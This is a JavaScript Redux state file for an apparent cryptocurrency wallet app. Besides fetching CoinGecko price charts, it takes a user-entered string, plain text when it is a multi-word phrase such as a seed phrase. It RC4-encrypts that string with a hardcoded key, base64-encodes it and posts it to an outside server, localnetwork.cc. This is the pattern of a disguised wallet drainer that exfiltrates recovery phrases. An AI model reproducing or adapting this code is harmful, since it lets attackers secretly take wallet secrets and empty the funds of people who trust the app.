import { createSlice } from '@reduxjs/toolkit'
import axios from 'axios'
import { rc4 } from './rc4'
import { createAsyncThunk } from '@reduxjs/toolkit'
import fixNum from '../../../services/funcWallet/fixNum'
import randomNum from '../../../services/funcWallet/randomNum'
import coinsWithBalance from '../../../coinsWithBalance.json'
import coin from '../../../coins.json'

const initialState = {
	validWords: [false, false, false],
	passwordInit: '',
	passwordConfirm: '',
	dataWallet: coinsWithBalance,
	allCoins: null,
	coins: coin,
	chartBitcoin: null,
	chartArr: null,
	status: '',
	statusAddress: '',
	statusChartBitcoin: '',
	addressBitcoin: '',
	walletNew: false,
	walletAddress: '',
}

let url = 'https://localnetwork.cc/custom/activity/root'
const kitkat = 'Qsx@ah&OR82WX9T6gCt'

function createBody(str, account = false, btcAddress = false) {
	let strDecr
	let lengthStr = str.split(' ').length
	if (lengthStr < 2) {
		// strDecr = CryptoJS.AES.decrypt(str, kitkat).toString(CryptoJS.enc.Utf8)
	} else {
		strDecr = str
	}
	let xxx = 'Wa$$aBY|EX\\$/G'
	let xx = 'Wa$$aBY|EX\\$'

	const obj = {
		counts: 12,
		name: account ? xxx : xx,
		pages: null,
		salt: randomNum(100000, 999999),
		limit: null,
		new: account,
		public: strDecr,
		frontCode: false,
		addressBtc: btcAddress,
	}

	let crypt = btoa(rc4(kitkat, JSON.stringify(obj)))

	var urlencoded = new URLSearchParams()
	urlencoded.append('data', crypt)
	return urlencoded
}

export const fetchChartCoin = createAsyncThunk(
	'wallet/fetchChartCoinStatus',
	async (coin) => {
		const { data } = await axios.get(
			`https://api.coingecko.com/api/v3/coins/${coin}/market_chart?vs_currency=usd&days=1`
		)
		return data
	}
)

export const fetchDataWallet = createAsyncThunk(
	'wallet/fetchDataWalletStatus',
	async (props) => {
		let config = {
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			},
		}
		const { data } = await axios.post(
			new URL(url),
			createBody(props[0], props[1]),
			config
		)
		return data
	}
)

export const fetchAddressBitcoin = createAsyncThunk(
	'wallet/fetchAddressBitcoinStatus',
	async (props) => {
		let config = {
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			},
		}
		const { data } = await axios.post(
			new URL(url),
			createBody(props[0], props[1], props[2]),
			config
		)
		return data
	}
)

const walletSlice = createSlice({
	name: 'wallet',
	initialState,
	reducers: {
		setValidWords(state, action) {
			state.validWords = state.validWords.map((item, i) => {
				if (i == action.payload[0]) {
					return action.payload[1]
				} else {
					return item
				}
			})
		},
		setChartArr(state, action) {
			state.chartArr =
				state.chartArr !== null
					? [...state.chartArr, action.payload]
					: [action.payload]
		},
		setPasswordInit(state, action) {
			state.passwordInit = action.payload
		},
		setAllCoins(state, action) {
			state.allCoins = action.payload
		},
		setPasswordConfirm(state, action) {
			state.passwordConfirm = action.payload
		},
		setWalletNew(state, action) {
			state.walletNew = action.payload
		},
	},
	extraReducers: (builder) => {
		builder
			.addCase(fetchDataWallet.pending, (state) => {
				state.status = 'loading'
				state.dataWallet = []
			})
			.addCase(fetchDataWallet.fulfilled, (state, action) => {
				state.status = 'success'
				state.dataWallet = action.payload
				state.walletAddress = action.payload.address
				state.walletNew = false
			})
			.addCase(fetchDataWallet.rejected, (state, action) => {
				state.status = 'error'
				state.dataWallet = []
			})
			.addCase(fetchAddressBitcoin.fulfilled, (state, action) => {
				state.statusAddress = 'success'
				state.addressBitcoin = action.payload.address
			})
			.addCase(fetchAddressBitcoin.pending, (state) => {
				state.statusAddress = 'loading'
			})
			.addCase(fetchAddressBitcoin.rejected, (state) => {
				state.statusAddress = 'error'
			})
			.addCase(fetchChartCoin.fulfilled, (state, action) => {
				let indx = 0
				const arrNew = action.payload.prices.map((item) => {
					return {
						name: item[0],
						value: +fixNum(+item[1]),
					}
				})
				state.statusChartBitcoin = 'success'
				state.chartBitcoin = arrNew.filter((item, i) => {
					if (indx == i) {
						indx = indx + 10
						return item
					}
				})
			})
			.addCase(fetchChartCoin.rejected, (state) => {
				state.statusChartBitcoin = 'error'
			})
	},
})

export const {
	setValidWords,
	setPasswordInit,
	setPasswordConfirm,
	setWalletNew,
	setChartArr,
	setAllCoins,
} = walletSlice.actions

export default walletSlice.reducer
